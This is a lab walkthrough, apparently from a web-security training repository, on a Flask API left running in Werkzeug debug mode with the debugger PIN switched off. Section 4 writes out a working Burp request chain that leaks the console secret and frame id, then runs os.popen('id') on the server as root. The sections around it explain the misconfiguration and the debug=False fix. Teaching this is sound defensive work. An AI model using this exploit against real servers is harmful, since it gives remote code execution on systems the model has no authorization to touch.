# Walkthrough — debug-enabled

The app is a tiny Flask API: one route takes a value, converts it to a number, and returns an item. Feed it a value that is not a number and the route throws — an **unhandled exception**. On a normally configured server that would be a dull `500`. But this app runs with `app.run(debug=True)`, Flask's development mode, so the error becomes an interactive **Werkzeug debug page**: your traceback, your source, your server paths — and a **console** that runs Python on the server. The debugger PIN that should guard that console is switched off. You crash the route on purpose, read the console's secret out of the page, and run a command.

The track is **Burp Suite (Repeater)**, start to finish: crash the route, read the debug page in the response, lift the secret, send one more request, and the command's output comes back in the response. Nothing runs in a browser — the code runs on the server, and its output is right there in the HTTP response.

## 1. Context

A tiny API on `127.0.0.1:8033` (vulnerable) and `127.0.0.1:8133` (fixed):

- `GET /` — a JSON banner. Not the target.
- `GET /items/<idx>` — converts `idx` to an integer and returns `ITEMS[int(idx)]` as JSON. A valid index (`/items/0`) returns an item; a non-numeric one (`/items/abc`) makes `int()` throw `ValueError`, and there is no `try/except` to catch it. That unhandled exception is the trigger.

This atom is **A05 — Security Misconfiguration**: a development feature of the framework has been left enabled where an attacker can reach it. The route logic is ordinary and correct; the flaw is the deployment mode.

Terms, defined once:

- **Werkzeug.** The HTTP/WSGI library that ships *underneath* Flask — Flask is built on top of it, and installing Flask installs Werkzeug (you do not install it separately). It provides Flask's built-in **development server** and its interactive error page. Everything "the debugger" does here is Werkzeug.
- **Development server vs production server.** `app.run()` starts Werkzeug's built-in server — light, meant for local testing while you code, and explicitly *not* for production (it prints `WARNING: This is a development server. Do not use it in a production deployment.`).
- **WSGI (Web Server Gateway Interface).** The standard "plug" between a Python web app and a real server. In production you run the app behind a **WSGI server** — Gunicorn or uWSGI — which has no debugger and no development server.
- **Debug mode.** `debug=True` turns on Werkzeug's interactive debugger (and a reloader). In this mode an unhandled exception is rendered as an interactive web page instead of a generic `500`.
- **Traceback.** Python's error report: the **call stack** (which function called which), the **local variables** at each level, and the exception message. Normally it goes to the server's log; in debug mode it is rendered as a web page.
- **Interactive debugger console.** Inside that page, each stack frame has a **console** — a field that runs **arbitrary Python inside the server process**. It exists so a developer can inspect state live. By definition it is arbitrary code execution: whoever reaches it runs whatever they want on the server.
- **Debugger PIN.** Werkzeug nominally guards the console with a **PIN** printed in the server's startup log. The PIN is *derived from machine data* (username, machine-id, MAC address), so a determined attacker can derive it — an obstacle, not a real lock. Here it is switched off entirely with `WERKZEUG_DEBUG_PIN=off`.
- **Information disclosure.** Handing an attacker internal detail — here your source code, variable values, and file paths — that helps them attack you.
- **RCE (Remote Code Execution).** Running arbitrary commands on the server.

The whole exploit is Burp; the "UI" is the debug page the framework renders for you.

## 2. See the debug page leak (the tell)

Before running any command, prove the first half of the impact: the crash itself hands you the server's internals. Send the malformed index to the vulnerable API:

```
GET /items/abc HTTP/1.1
Host: 127.0.0.1:8033
```

The response is `500`, but the body is Werkzeug's interactive debugger — ~14 KB of HTML titled **Werkzeug Debugger**. It leaks, in order:

- The exception, verbatim:

  ```
  ValueError: invalid literal for int() with base 10: 'abc'
  ```

- Your **source code** — the exact line that threw, pulled from the server's files:

  ```
  return jsonify({"item": ITEMS[int(idx)]})
  ```

- Server **file paths**, revealing the layout and the framework version:

  ```
  File "/app/app.py", line 33, in get_item
  File "/usr/local/lib/python3.11/site-packages/flask/app.py", line 1478, in __call__
  ```

That is **information disclosure** on its own — a finding before any code runs. Now send the exact same request to the **fixed** API on `127.0.0.1:8133`:

```
GET /items/abc HTTP/1.1
Host: 127.0.0.1:8133
```

The response is a bare, generic `500` — 265 bytes, no traceback, no source, no console:

```html
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Same input, same exception, two completely different responses. The difference is the debug flag — hold that for section 7.

## 3. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The route:

```python
@app.route("/items/<idx>")
def get_item(idx):
    return jsonify({"item": ITEMS[int(idx)]})
```

and the entry point:

```python
if __name__ == "__main__":
    os.environ["WERKZEUG_DEBUG_PIN"] = "off"
    app.run(host=os.environ.get("HOST", "127.0.0.1"), port=5000, debug=True)
```

The route is fine — it converts an index and returns an item. There is no missing authorization check and no injection. The audit question is not "did the route handle the error?" The exception is only the *trigger*. The question is "what does this server do with an unhandled exception?" — and the answer is set by `debug=True`: it serves the interactive debugger. `WERKZEUG_DEBUG_PIN=off` removes the one lock in front of that debugger's console. Confirm it in the container's startup log:

```
* Debugger is active!
* Debugger PIN disabled. DEBUGGER UNSECURED!
```

The fix is `debug=False`.

## 4. Exploitation — run a command through the exposed console

### 4.1 Baseline

A valid index works, identically on both sides:

```
GET /items/0 HTTP/1.1
Host: 127.0.0.1:8033
```

```json
{"item":"alpha"}
```

The fixed API on `127.0.0.1:8133` returns the byte-identical `{"item":"alpha"}`. The feature is the same on both; only what happens on a crash differs.

### 4.2 Crash the route and read the console's secret

Send `GET /items/abc` again (section 2) and look inside the debug page's HTML for the console's credentials. Two things are embedded in a `<script>` block near the top:

```javascript
    EVALEX = true,
    EVALEX_TRUSTED = true,
    SECRET = "P5z6WMEJmVJyQnvTVQlt";
```

`EVALEX = true` means the console is available; `EVALEX_TRUSTED = true` is Werkzeug telling you the PIN is off, so no unlock step is needed. `SECRET` is the per-process token the console requires. Then find a **frame id** — each stack frame in the page is a `<div class="frame" id="frame-NNNN">`; take the innermost one (the last on the page, where the exception was raised):

```html
<div class="frame" id="frame-139078990912896">
```

> Your `SECRET` and frame id will differ from these — they are generated per server process and per exception. Read your own out of your own debug page.

### 4.3 Run a command — RCE

The console executes over HTTP with four query parameters on the same URL: `__debugger__=yes` marks the request as the debugger's, `cmd` is the Python to run, `frm` is the frame id whose context to run in, and `s` is the secret. Ask it to run `id`:

```
GET /items/abc?__debugger__=yes&cmd=__import__("os").popen("id").read()&frm=139078990912896&s=P5z6WMEJmVJyQnvTVQlt HTTP/1.1
Host: 127.0.0.1:8033
```

(The `cmd` value is URL-encoded on the wire — the quotes become `%22`; Burp encodes it when you edit the query.)

The response is `200`, and the body is the console echoing your command and its result:

```
>>> __import__("os").popen("id").read()
'uid=0(root) gid=0(root) groups=0(root)'
```

That is **RCE**. You ran a command on the server and its output came straight back in the HTTP response — and `uid=0(root)` says it ran as root inside the container. You did not inject anything into the app; the console was already exposed, and you typed into it.

> This is a local lab: both apps bind to `127.0.0.1`, the data is dummy, and every step ran in Burp against your own disposable container. Keep the payloads demonstrative — `id`, or `__import__("os").system("touch /tmp/pwned")` to drop a harmless marker you can confirm with `docker compose exec vulnerable ls -la /tmp/pwned`. On a real target this is full server compromise; never run anything destructive, nothing that reaches the network, nothing that leaves the container.

## 5. What the vuln is NOT

Four wrong conclusions to kill.

**It is not that "the route forgot to handle the error."** The exception is only the *trigger*, not the vuln. Proof of isolation: the same `/items/abc` on the fixed side (`debug=False`) throws the identical exception and returns a bare `500` — no console. Wrapping the route in `try/except` would hide *this* one error, but the development debugger would still be on, and the *next* unhandled exception (another route, another input, a future bug) reopens the console. You would be treating the symptom.

**It is not that "the PIN was missing."** The PIN is derived from machine data (username, machine-id, MAC) — and the debug page itself leaks several of those inputs (your username shows up in file paths). A determined attacker can derive it; it is an obstacle, not a wall. And a development console has no business being reachable in the first place. Turning the PIN on locks (badly) a door that should not exist in this environment.

**It is not injection.** You did not inject code into a parser, an interpreter, or a shell. You reached a console the framework *itself* exposes in development mode and typed Python into it. Nothing of yours "became code" — the execution facility was already open.

**It is not a bug in the application.** The route code is correct. The flaw is **configuration** — development mode left reachable — which is why this is A05 (Security Misconfiguration) and not a code bug. Compare [`command-injection-basic`](../../A03-injection/command-injection-basic/) and [`deserialization-pickle`](../../A08-data-integrity-failures/deserialization-pickle/): same RCE ceiling, but there the attacker's data becomes code; here the code console was simply left open.

## 6. Impact

Two findings, stacked. **Information disclosure:** the debug page hands out your source, local variables, and server paths (section 2). **RCE:** the console runs arbitrary Python in the server process (section 4). RCE is the ceiling — the same ceiling as [`command-injection-basic`](../../A03-injection/command-injection-basic/) (a shell runs stitched-together input) and [`deserialization-pickle`](../../A08-data-integrity-failures/deserialization-pickle/) (a deserializer runs behavior in the bytes), reached here by a different door: an exposed development debugger. No overclaim beyond that — it is RCE in the app's container, which is already the top. On a real internet-facing host, this is one of the fastest paths to full compromise, which is why "don't ship debug mode" is a rule, not a suggestion.

## 7. Why the fix works

Run the whole chain against the fixed API on port **8133** (see [`DIFF.md`](./DIFF.md)). It runs with `debug=False`.

- `GET /items/abc` → the bare generic `500` from section 2. No traceback, no source, no `SECRET`, no console.
- The section-4.3 eval request → also just a `500`. With no debugger middleware, `?__debugger__=yes&cmd=...` is inert: `/items/<idx>` still runs with `idx="abc"`, `int()` still throws, and you get the generic error. There is no console to reach, so `docker compose exec fixed ls -la /tmp/pwned` shows the marker was never created.

The isolation proof: `GET /items/0` returns an identical `{"item":"alpha"}` on **both** ports — the feature is the same. Only the *crash* tells the sides apart (debugger + RCE on 8033, bare `500` on 8133), and that difference traces purely to the debug flag.

The fix is one thing: turn off debug mode. Not "set the PIN" — it is derivable, and the console should not be exposed at all. Not "catch the exception" — that hides one trigger while the debugger stays on for the next. `debug=False`, and in production serve the app behind a real WSGI server (Gunicorn/uWSGI) that has no development server and no debugger. See [`DIFF.md`](./DIFF.md) for the diff and why the half-fixes do not hold.
